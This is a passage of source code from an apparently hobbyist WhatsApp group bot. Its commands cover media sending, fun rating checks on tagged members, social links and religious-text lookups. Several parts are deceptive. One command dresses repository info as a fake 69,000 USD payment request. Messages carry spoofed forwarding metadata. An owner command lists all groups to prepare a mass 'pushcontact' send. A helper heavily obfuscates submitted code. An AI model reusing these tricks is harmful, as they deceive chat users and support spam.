let videobuffy = fs.readFileSync(`./ES_TEAMS-MEDIA/video/${BhosdikaXlicon}.mp4`)
XliconBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

//reply features end here
//---------------------------------------------------------------------------------------------------------------------------//



//send features
const sendapk = (teks) => {
XliconBotInc.sendMessage(m.chat, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXlicon of ApkXlicon) {
if (budy === BhosdikaXlicon) {
let buffer = fs.readFileSync(`./ES_TEAMS-MEDIA/apk/${BhosdikaXlicon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
XliconBotInc.sendMessage(m.chat, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXlicon of ZipXlicon) {
if (budy === BhosdikaXlicon) {
let buffer = fs.readFileSync(`./ES_TEAMS-MEDIA/zip/${BhosdikaXlicon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
XliconBotInc.sendMessage(m.chat, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXlicon of DocXlicon) {
if (budy === BhosdikaXlicon) {
let buffer = fs.readFileSync(`./ES_TEAMS-MEDIA/doc/${BhosdikaXlicon}.pdf`)
senddocu(buffer)
}
}



async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

//send features end here
//---------------------------------------------------------------------------------------------------------------------------//




// Response Addlist
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
XliconBotInc.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
XliconBotInc.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
} 
}



// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
    userJid: XliconBotInc.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, XliconBotInc.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
XliconBotInc.ev.emit('messages.upsert', msg)
} 

//---------------------------------------------------------------------------------------------------------------------------//




switch(isCommand) {


//FUN COMMANDS 
 case 'gaycheck':
case 'cutecheck':
case 'lesbicheck':
case 'lesbiancheck':
case 'hornycheck':
case 'prettycheck':
case 'lovelycheck':
case 'uglycheck':
case 'handsomecheck': {
    // Ensure someone is tagged
    if (!m.mentionedJid || m.mentionedJid.length === 0) {
        return replygcxlicon(`Please mention someone to check! Example: ${prefix + command} @Xlicon`);
    }

    // Generate a random percentage
    const gan = Array.from({ length: 100 }, (_, i) => i + 1);
    const teng = gan[Math.floor(Math.random() * gan.length)];

    // Get the first mentioned user
    let xliconshimts = m.mentionedJid[0];

    // Create the message text
    const messageText = `
*${command.replace('check', ' Check')}* 🌟

👤 Name: *@${xliconshimts.split('@')[0]}*
📊 Score: *${teng}%*
`.trim();

    // Image URL to use (this can be customized)
    const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

    try {
        // Send the message with the image URL
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: imageUrl }, // Directly use the URL for the image
            caption: messageText, // Custom message with check result and mentioned user
            mentions: [xliconshimts] // Mentions the mentioned user
        });
    } catch (error) {
        console.error('Error sending image:', error);
        replygcxlicon('Failed to send image. Please try again later.');
    }
}
break;


  
      case 'charactercheck': {
        if (!m.mentionedJid || m.mentionedJid.length === 0) {
            return replygcxlicon(`Please tag someone! Example: ${prefix + command} @Xlicon`);
        }
    
        const traits = [
            'Compassionate', 
            'Generous', 
            'Grumpy', 
            'Forgiving', 
            'Obedient', 
            'Good', 
            'Simp', 
            'Kind-Hearted', 
            'Patient', 
            'UwU', 
            'Top, anyway', 
            'Helpful'
        ];
        const randomTrait = traits[Math.floor(Math.random() * traits.length)];
    
        const mentionedUser = m.mentionedJid[0];
        const username = mentionedUser.split('@')[0];
    
        const messageText = `
*Character Check* 🕵️‍♂️✨
    
👤 Name: *@${username}*
📜 Trait: *${randomTrait}*
        `.trim();
    
        const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg'; // Replace with your desired image URL
    
        try {
            // Send the message with the image URL
            await XliconBotInc.sendMessage(m.chat, {
                image: { url: imageUrl },
                caption: messageText,
                mentions: [mentionedUser],
            });
        } catch (error) {
            console.error('Error sending image:', error);
            replygcxlicon('Failed to send image. Please try again later.');
        }
    }
    break;

  case 'beautifulcheck': {
    // Ensure someone is tagged
    if (!m.mentionedJid || m.mentionedJid.length === 0) {
        return replygcxlicon(`Please tag someone! Example: ${prefix + command} @Xlicon`);
    }

    // Generate a random percentage
    const percentage = Math.floor(Math.random() * 101); // Random number between 0 and 100

    // Get the first mentioned user
    const mentionedUser = m.mentionedJid[0];
    const username = mentionedUser.split('@')[0];

    // Create the response message
    const messageText = `
*Beautiful Check* 🌸

👤 Name: *@${username}*
📊 Score: *${percentage}%*
    `.trim();

    // Image URL to use (this can be customized)
    const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg'; // Replace with your desired image URL

    try {
        // Send the message with the image and mentions
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: imageUrl }, // Directly use the URL for the image
            caption: messageText, // Custom message with check result and mentioned user
            mentions: [mentionedUser] // Mentions the mentioned user
        });
    } catch (error) {
        console.error('Error sending image:', error);
        replygcxlicon('Failed to send image. Please try again later.');
    }
}
break;



  case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await XliconBotInc.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break

			case 'rentbot':
    // Image URL to use (this can be customized)
    const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg'; // Replace with your desired image URL

    // Message text with emojis
    const messageText = `Type ${prefix}owner and chat him 💬👑`;

    // Send the message with the image and the text
    await XliconBotInc.sendMessage(m.chat, {
        image: { url: imageUrl }, // Directly use the URL for the image
        caption: messageText, // The custom message with emojis
    });
    break;

        
        
 case 'idgroup': 
case 'idgc': 
case 'groupid': {
    if (!XliconTheCreator) return XliconStickOwner();
    try {
        let getGroups = await XliconBotInc.groupFetchAllParticipating();
        let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1]);
        let anu = groups.map((v) => v.id);
        let teks = `💬 *GROUP LIST BELOW* 🌟\n\n📝 Total Groups: *${anu.length}* Groups\n\n`;

        for (let x of anu) {
            try {
                let metadata2 = await XliconBotInc.groupMetadata(x);
                teks += `🌍 *Group Name*: ${metadata2.subject}\n🆔 *Group ID*: ${metadata2.id}\n👥 *Members*: ${metadata2.participants.length}\n\n────────────────────────\n\n`;
            } catch (err) {
                teks += `❌ Error fetching metadata for group ID: ${x}\n`;
            }
        }

        replygcxlicon(teks + `⚡ To use, please type command: ${prefix}pushcontact idgroup|teks\n\nBefore using, please first copy the group ID above. 👇`);
    } catch (err) {
        replygcxlicon("⚠️ There was an error while fetching the group list. Please try again later.");
    }
}
break;
  
        
case 'repo': case 'repository': {
  try {
    const [, username, repoName] = botscript.match(/github\.com\/([^/]+)\/([^/]+)/)
    const response = await axios.get(`https://api.github.com/repos/${username}/${repoName}`)
    if (response.status === 200) {
      const repoData = response.data
      const formattedInfo = `
✨ *Repository Name:* _${repoData.name}_
📄 *Description:* _${repoData.description || 'No description provided.'}_
👤 *Owner:* _${repoData.owner.login}_
⭐ *Stars:* _${repoData.stargazers_count}_
🍴 *Forks:* _${repoData.forks_count}_
🔗 *URL:* ${repoData.html_url}
      `.trim()
      await XliconBotInc.relayMessage(m.chat, {
        requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: 69000,
          requestFrom: m.sender,
          noteMessage: {
            extendedTextMessage: {
              text: formattedInfo,
              contextInfo: {
                externalAdReply: {
                  showAdAttribution: true
                }
              }
            }
          }
        }
      }, { quoted: m })
    } else {
      await replygcxlicon(`Unable to fetch repository information`)
    }
  } catch (error) {
    console.error(error)
    await replygcxlicon(`Repository currently not available`)
  }
}
break

			
            case 'myip':
            case 'ipbot':
                if (!XliconTheCreator) return XliconStickOwner()
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        replygcxlicon("🔎 My public IP address is: " + ip);
                    })
                })
            break
        
           
    case 'request': case 'reportbug': {
    if (!text) return replygcxlicon(`Example : ${prefix + command} hi ES TEAMS play command is not working 🐞`);

    const textt = `*| REQUEST/BUG |* 📝`;
    const teks1 = `\n\n*User* : @${m.sender.split("@")[0]} 👤\n*Request/Bug* : ${text} 🛠️`;
    const teks2 = `\n\n*Hii ${m.pushName},* Your request has been forwarded to my Owners 👑.\n*Please wait...* ⏳`;

    // Send to all owners
    for (let i of owner) {
        XliconBotInc.sendMessage(i + "@s.whatsapp.net", {
            text: textt + teks1,
            mentions: [m.sender],
        }, {
            quoted: m,
        });
    }

    // Send response to the user
    XliconBotInc.sendMessage(m.chat, {
        text: textt + teks2 + teks1,
        mentions: [m.sender],
    }, {
        quoted: m,
    });
}
break;
    
case 'socialmedia': 
case 'sosmed': 
case 'update': {
    const slides = [
        [
            'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png', // Image URL
            '', // Title
            `🎥 *Subscribe to the Developer's YouTube Channel for Updates*`, // Body message
            botname, // Footer message
            '🔗 Visit', // Button display text
            'https://youtube.com/@esteams', // Command (URL in this case)
            'cta_url', // Button type
            'https://youtube.com/@esteams' // URL (used in image generation)
        ], 
        [
            'https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Telegram_2019_Logo.svg/1024px-Telegram_2019_Logo.svg.png', // Image URL
            '', // Title
            `📱 *Join the Developer's Telegram Channel for Updates*`, // Body message
            botname, // Footer message
            '🔗 Visit', // Button display text
            'https://t.me/examsolutionteam', // Command (URL in this case)
            'cta_url', // Button type
            'https://t.me/examsolutionteam' // URL (used in image generation)
        ], 
        [
            'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/GitHub_Invertocat_Logo.svg/360px-GitHub_Invertocat_Logo.svg.png', // Image URL
            '', // Title
            `🐱 *Follow the Developer on GitHub*`, // Body message
            botname, // Footer message
            '🔗 Visit', // Button display text
            'https://github.com/paskito002', // Command (URL in this case)
            'cta_url', // Button type
            'https://github.com/paskito002' // URL (used in image generation)
        ], 
        [
            'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/264px-Instagram_logo_2016.svg.png', // Image URL
            '', // Title
            `📸 *Follow ES TEAMS on Whatsapp*`, // Body message
            botname, // Footer message
            '🔗 Visit', // Button display text
            'https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y', // Command (URL in this case)
            'cta_url', // Button type
            'https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y' // URL (used in image generation)
        ], 
        [
            'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png', // Image URL
            '', // Title
            `💬 *Contact the ES TEAMS on WhatsApp*`, // Body message
            botname, // Footer message
            '🔗 Visit', // Button display text
            'https://Wa.me/2349037524605', // Command (URL in this case)
            'cta_url', // Button type
            'https://Wa.me/2349037524605' // URL (used in image generation)
        ], 
    ];

    const sendSlide = async (jid, title, message, footer, slides) => {
        const cards = slides.map(async slide => {
            const [
                image,
                titMess,
                boMessage,
                fooMess,
                textCommand,
                command,
                buttonType,
                url,
            ] = slide;
            let buttonParamsJson = {};
            switch (buttonType) {
                case "cta_url":
                    buttonParamsJson = {
                        display_text: textCommand,
                        url: url,
                        merchant_url: url,
                    };
                    break;
                case "cta_call":
                    buttonParamsJson = { display_text: textCommand, id: command };
                    break;
                case "cta_copy":
                    buttonParamsJson = {
                        display_text: textCommand,
                        id: "",
                        copy_code: command,
                    };
                    break;
                case "cta_reminder":
                case "cta_cancel_reminder":
                case "address_message":
                    buttonParamsJson = { display_text: textCommand, id: command };
                    break;
                case "send_location":
                    buttonParamsJson = {};
                    break;
                case "quick_reply":
                    buttonParamsJson = { display_text: textCommand, id: command };
                    break;
                default:
                    break;
            }
            const buttonParamsJsonString = JSON.stringify(buttonParamsJson);
            return {
                body: proto.Message.InteractiveMessage.Body.fromObject({
                    text: boMessage,
                }),
                footer: proto.Message.InteractiveMessage.Footer.fromObject({
                    text: fooMess,
                }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: titMess,
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia(
                        { image: { url: image } },
                        { upload: XliconBotInc.waUploadToServer },
                    )),
                }),
                nativeFlowMessage:
                    proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                            {
                                name: buttonType,
                                buttonParamsJson: buttonParamsJsonString,
                            },
                        ],
                    }),
            };
        });
        
        const msg = generateWAMessageFromContent(
            jid,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2,
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.fromObject({
                                text: message,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                                text: footer,
                            }),
                            header: proto.Message.InteractiveMessage.Header.fromObject({
                                title: title,
                                subtitle: title,
                                hasMediaAttachment: false,
                            }),
                            carouselMessage:
                                proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                    cards: await Promise.all(cards),
                                }),
                            contextInfo: {
                                mentionedJid: [m.sender], 
                                forwardingScore: 999,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '120363313305181359@newsletter',
                                    newsletterName: ownername,
                                    serverMessageId: 143
                                }
                            }
                        }),
                    },
                },
            },
            { quoted: m},
        );
        await XliconBotInc.relayMessage(jid, msg.message, {
            messageId: msg.key.id,
        });
    };

    // Send the slide to the group or user
    await sendSlide(m.chat, 'Social Media Links', 'Check out the Developer’s social media for updates!', botname, slides);

    // Send the social media links in a formatted way
    await replygcxlicon(`
Here are the Developer's Social Media Links for Updates:

🎥 *Subscribe to the Developer's YouTube Channel for Updates*  
🔗 Visit: https://youtube.com/@esteams

📱 *Join the Developer's Telegram Channel for Updates*  
🔗 Visit: https://t.me/examsolutionteam

🐱 *Follow the Developer on GitHub*  
🔗 Visit: https://github.com/paskito002

📸 *Follow the Developer on Instagram*  
🔗 Visit: https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y

💬 *Contact the Developer on WhatsApp*  
🔗 Visit: https://Wa.me/2349037524605

For more updates, check out the links above!
`);

    // Send a regular reply to confirm the action
    await replygcxlicon('Here are the social media links and updates for ES TEAMS TECH! 🌐✨');
}
break;




			case 'gita-verse': case 'gita': case 'bhagavatgita': {
	try {
    // Extract the verse number from the command text.
    let verseNumber = m.text.split(' ')[1]
    if (!verseNumber || isNaN(verseNumber)) {
      verseNumber = Math.floor(Math.random() * 700) + 1
    }
    let res = await fetch(`https://gita-api.vercel.app/odi/verse/${verseNumber}`)
    if (!res.ok) {
      let error = await res.json()
      throw new Error(
        `API request failed with status ${res.status} and message ${error.detail[0].msg}`
      )
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let gitaVerse = `
🕉 *Bhagavad Gita: Sacred Teachings*\n
📜 *Chapter ${json.chapter_no}: ${json.chapter_name}*\n
Verse ${json.verse_no}:\n
" ${json.verse} "\n
*🔮 Translation:*\n
${json.translation}\n
*🧘‍♂️ Spiritual Insight (Purport):*\n
${json.purport}`
    replygcxlicon(gitaVerse)
    if (json.audio_link) {
      XliconBotInc.sendMessage(m.chat, {audio: {url:json.audio_link}, mimetype: 'audio/mp4', ptt: true}, {quoted:m})
    }
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
}
break

			case 'quran': {
    try {
    // Extract the surah number or name from the command text.
    let surahInput = m.text.split(' ')[1]
    if (!surahInput) {
      throw new Error(`Please specify the surah number or name`)
    }
    let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran')
    let surahList = await surahListRes.json()
    let surahData = surahList.data.find(surah => 
        surah.number === Number(surahInput) || 
        surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() || 
        surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
    )
    if (!surahData) {
      throw new Error(`Couldn't find surah with number or name "${surahInput}"`)
    }
    let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`)
    if (!res.ok) {
      let error = await res.json();
      throw new Error(`API request failed with status ${res.status} and message ${error.message}`)
    }

    let json = await res.json()

    // Translate tafsir from Bahasa Indonesia to Urdu
    let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true })

    // Translate tafsir from Bahasa Indonesia to English
    let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true })

    let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}`

    replygcxlicon(quranSurah)

    if (json.data.recitation.full) {
      XliconBotInc.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
    }
  } catch (error) {
    replygcxlicon(`Error: ${error.message}`)
  }
  }
  break
			
    case 'animequote': {
  try {
    const res = await fetch('https://some-random-api.com/animu/quote');
    if (!res.ok) throw await res.text()
    const json = await res.json()
    const { sentence, character, anime } = json
    const message = `🌟Quote\n${sentence}\n\n🌟Character: \`\`\`${character}\`\`\`\n🌟Anime: \`\`\`${anime}\`\`\`\n`
    
    // Send the message using replygcxlicon
    return replygcxlicon(message)
  } catch (error) {
    console.error(error)
  }
 }
  break


  case 'bible': {
  const { translate } = require('@vitalets/google-translate-api')
  const BASE_URL = 'https://bible-api.com'

  try {
    // Extract the chapter number or name from the command text.
    let chapterInput = m.text.split(' ').slice(1).join('').trim()
    if (!chapterInput) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }

    // Encode the chapterInput to handle special characters
    chapterInput = encodeURIComponent(chapterInput);

    // Make an API request to fetch the chapter information.
    let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`)
    if (!chapterRes.ok) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }

    let chapterData = await chapterRes.json();

    // Translate the chapter content into Hindi and English
    let translatedChapterHindi = await translate(chapterData.text, { to: 'hi', autoCorrect: true })
    let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true })

    // Format the Bible chapter message
    let bibleChapter = `📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`

    // Send the formatted message using replygcxlicon
    return replygcxlicon(bibleChapter)

  } catch (error) {
    replygcxlicon(`Error: ${error.message}`)
  }
 }     
  break



//------------------------------------------------------------------------------------------//
//New Islam Cmds

case 'namazchk': {
  // Poll options for prayer times
  const options = ['Fajr', 'Zuhr', 'Asr', 'Maghrib', 'Isha'];

  // Check if the user is authorized
  if (!XliconTheCreator) return XliconStickOwner();

  // Prepare the question and options for the poll
  const pollQuestion = 'Which prayer(s) did you offer?';
  try {
    // Send the poll with the prayer options
    await XliconBotInc.sendMessage(m.chat, {
      poll: {
        name: pollQuestion,
        values: options,
      }
    });
  } catch {
    replygcxlicon(
      `Error: Please make sure to provide at least 2 options for the poll.\nExample: ${prefix}poll Who is best admin?|ES TEAMS,Cheems,Doge...`
    );
  }
}
break;




case 'kisahnabi': {
  const prophets = [
      'adam', 'ayyub', 'daud', 'dzulkifli', 'harun', 'hud', 'ibrahim', 'idris', 
      'ilyas', 'ilyasa', 'isa', 'ishaq', 'ismail', 'luth', 'muhammad', 'musa', 
      'nuh', 'sholeh', 'sulaiman', 'syuaib', 'yahya', 'yaqub', 'yunus', 'yusuf', 'zakariya'
  ];

  // Ensure the text input is properly trimmed and lowercased
  const selectedProphet = text?.trim().toLowerCase();

  // Check if a text was provided
  if (!text) {
      const prophetList = prophets.map(prophet => `- ${prophet.charAt(0).toUpperCase() + prophet.slice(1)}`).join('\n');
      const message = `*Select a Prophet*\n\nPlease type the name of a prophet from the list below to read their story:\n\n${prophetList}`;
      await XliconBotInc.sendText(m.chat, message);
      return;
  }

  // Check if the selected prophet is valid
  if (!prophets.includes(selectedProphet)) {
      return XliconBotInc.sendText(
          m.chat, "*Not Found*\n*📮 Tips:* Please select a valid prophet from the list."
      );
  }

  // Fetch and display the story and image of the selected prophet
  try {
      const response = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${selectedProphet}.json`);
      const story = await response.json();

      // Static image URL for all prophets
      const imageUrl = 'https://i.ibb.co/8NksWfT/ISLAM-IMAGE.png'; // Replace with actual image URL for each prophet if needed

      // Format the story with relevant details
      const formattedStory = `_*👳 Prophet:*_ ${story.name}\n`
                            + `_*📅 Date of Birth:*_ ${story.thn_kelahiran}\n`
                            + `_*📍 Place of Birth:*_ ${story.tmp}\n`
                            + `_*📊 Age:*_ ${story.usia}\n\n`
                            + `*— — —  [ S T O R Y ] — — —*\n\n`
                            + `${story.description}`;

      // Translate the story to English if possible
      const translation = await translate(formattedStory, { to: 'en' }).catch(() => null);

      // Send the message with the story and image
      if (translation?.text) {
          await XliconBotInc.sendMessage(m.chat, {
              image: { url: imageUrl }, // Static image URL
              caption: translation.text // Translated story text
          });
      } else {
          await XliconBotInc.sendMessage(m.chat, {
              image: { url: imageUrl }, // Static image URL
              caption: formattedStory // Original story text
          });
      }
  } catch (error) {
      await XliconBotInc.sendText(
          m.chat, "*Not Found*\n*📮 Tips:* Please try selecting a prophet from the list."
      );
  }
}
break;



case 'asmaulhusna': {
  const contoh = `*Asmaul Husna*`;
  const anjuran = `
Dari Abu hurarirah radhiallahu anhu, Rasulullah Saw bersabda: "إِنَّ لِلَّهِ تَعَالَى تِسْعَةً وَتِسْعِينَ اسْمًا، مِائَةٌ إِلَّا وَاحِدًا، مَنْ أَحْصَاهَا دخل الجنة، وهو وتر يُحِبُّ الْوِتْرَ"
Artinya: "Sesungguhnya Allah mempunyai sembilan puluh sembilan nama, alias seratus kurang satu. Barang siapa yang menghitung-hitungnya, niscaya masuk surga; Dia Witir dan menyukai yang witir".`;

  const asmaulhusna = [
      { index: 1, latin: "Ar Rahman", arabic: "الرَّحْمَنُ", translation_id: "مطلق صفت رحمت والا", translation_en: "The All Beneficent" },
      { index: 2, latin: "Ar Rahiim", arabic: "الرَّحِيمُ", translation_id: "مطلق صفت شفقت والا", translation_en: "The Most Merciful" },
      { index: 3, latin: "Al Malik", arabic: "الْمَلِكُ", translation_id: "مطلق صفت حکمرانی والا", translation_en: "The King, The Sovereign" },
      { index: 4, latin: "Al Quddus", arabic: "الْقُدُّوسُ", translation_id: "مطلق صفت پاک", translation_en: "The Most Holy" },
      { index: 5, latin: "As Salaam", arabic: "السَّلاَمُ", translation_id: "مطلق صفت سلامتی والا", translation_en: "Peace and Blessing" },
      { index: 6, latin: "Al Mu’min", arabic: "الْمُؤْمِنُ", translation_id: "مطلق صفت امن دینے والا", translation_en: "The Guarantor" },
      { index: 7, latin: "Al Muhaimin", arabic: "الْمُهَيْمِنُ", translation_id: "مطلق صفت نگہبان", translation_en: "The Guardian, the Preserver" },
      { index: 8, latin: "Al ‘Aziiz", arabic: "الْعَزِيزُ", translation_id: "مطلق صفت عزت والا", translation_en: "The Almighty, the Self Sufficient" },
      { index: 9, latin: "Al Jabbar", arabic: "الْجَبَّارُ", translation_id: "مطلق صفت طاقت والا", translation_en: "The Powerful, the Irresistible" },
      { index: 10, latin: "Al Mutakabbir", arabic: "الْمُتَكَبِّرُ", translation_id: "مطلق صفت بڑائی والا", translation_en: "The Tremendous" },
      { index: 11, latin: "Al Khaliq", arabic: "الْخَالِقُ", translation_id: "مطلق صفت خالق", translation_en: "The Creator" },
      { index: 12, latin: "Al Baari’", arabic: "الْبَارِئُ", translation_id: "مطلق صفت بنانے والا", translation_en: "The Maker" },
      { index: 13, latin: "Al Mushawwir", arabic: "الْمُصَوِّرُ", translation_id: "مطلق صفت شکل دینے والا", translation_en: "The Fashioner of Forms" },
      { index: 14, latin: "Al Ghaffaar", arabic: "الْغَفَّارُ", translation_id: "مطلق صفت معاف کرنے والا", translation_en: "The Ever Forgiving" },
      { index: 15, latin: "Al Qahhaar", arabic: "الْقَهَّارُ", translation_id: "مطلق صفت قاہر", translation_en: "The All Compelling Subduer" },
      { index: 16, latin: "Al Wahhaab", arabic: "الْوَهَّابُ", translation_id: "مطلق صفت عطا کرنے والا", translation_en: "The Bestower" },
      { index: 17, latin: "Ar Razzaaq", arabic: "الرَّزَّاقُ", translation_id: "مطلق صفت رزق دینے والا", translation_en: "The Ever Providing" },
      { index: 18, latin: "Al Fattaah", arabic: "الْفَتَّاحُ", translation_id: "مطلق صفت رحمت کھولنے والا", translation_en: "The Opener, the Victory Giver" },
      { index: 19, latin: "Al ‘Aliim", arabic: "اَلْعَلِيْمُ", translation_id: "مطلق صفت عالم", translation_en: "The All Knowing, the Omniscient" },
      { index: 20, latin: "Al Qaabidh", arabic: "الْقَابِضُ", translation_id: "مطلق صفت تنگ کرنے والا", translation_en: "The Restrainer, the Straightener" },
      { index: 21, latin: "Al Baasith", arabic: "الْبَاسِطُ", translation_id: "مطلق صفت پھیلانے والا", translation_en: "The Expander, the Munificent" },
      { index: 22, latin: "Al Khaafidh", arabic: "الْخَافِضُ", translation_id: "مطلق صفت نیچا کرنے والا", translation_en: "The Abaser" },
      { index: 23, latin: "Ar Raafi’", arabic: "الرَّافِعُ", translation_id: "مطلق صفت اونچا کرنے والا", translation_en: "The Exalter" },
      { index: 24, latin: "Al Mu’izz", arabic: "الْمُعِزُّ", translation_id: "مطلق صفت عزت دینے والا", translation_en: "The Giver of Honor" },
      { index: 25, latin: "Al Mudzil", arabic: "المُذِلُّ", translation_id: "مطلق صفت ذلت دینے والا", translation_en: "The Giver of Dishonor" },
      { index: 26, latin: "Al Samii’", arabic: "السَّمِيعُ", translation_id: "مطلق صفت سننے والا", translation_en: "The All Hearing" },
      { index: 27, latin: "Al Bashiir", arabic: "الْبَصِيرُ", translation_id: "مطلق صفت دیکھنے والا", translation_en: "The All Seeing" },
      { index: 28, latin: "Al Hakam", arabic: "الْحَكَمُ", translation_id: "مطلق صفت فیصلے والا", translation_en: "The Judge, the Arbitrator" },
      { index: 29, latin: "Al ‘Adl", arabic: "الْعَدْلُ", translation_id: "مطلق صفت عدل", translation_en: "The Utterly Just" },
      { index: 30, latin: "Al Lathiif", arabic: "اللَّطِيفُ", translation_id: "مطلق صفت نرمی والا", translation_en: "The Subtly Kind" },
      { index: 31, latin: "Al Khabiir", arabic: "الْخَبِيرُ", translation_id: "مطلق صفت رازوں کا جاننے والا", translation_en: "The All Aware" },
      { index: 32, latin: "Al Haliim", arabic: "الْحَلِيمُ", translation_id: "مطلق صفت بردبار", translation_en: "The Forbearing, the Indulgent" },
      { index: 33, latin: "Al ‘Azhiim", arabic: "الْعَظِيمُ", translation_id: "مطلق صفت عظیم", translation_en: "The Magnificent, the Infinite" },
      { index: 34, latin: "Al Ghafuur", arabic: "الْغَفُورُ", translation_id: "مطلق صفت معاف کرنے والا", translation_en: "The All Forgiving" },
      { index: 35, latin: "As Syakuur", arabic: "الشَّكُورُ", translation_id: "مطلق صفت شکرگزار", translation_en: "The Grateful" },
      { index: 36, latin: "Al ‘Aliy", arabic: "الْعَلِيُّ", translation_id: "مطلق صفت اعلی", translation_en: "The Sublimely Exalted" },
      { index: 37, latin: "Al Kabir", arabic: "الْكَبِيرُ", translation_id: "مطلق صفت بڑا", translation_en: "The All Great" },
      { index: 38, latin: "Al Hafiz", arabic: "الْحَفِيظُ", translation_id: "مطلق صفت محفوظ کرنے والا", translation_en: "The Preserver" },
      { index: 39, latin: "Al Muqit", arabic: "الْمُقيِت", translation_id: "مطلق صفت نگہبان", translation_en: "The Sustainer" },
      { index: 40, latin: "Al Hasib", arabic: "الْحَسِيبُ", translation_id: "مطلق صفت حساب لینے والا", translation_en: "The Reckoner" },
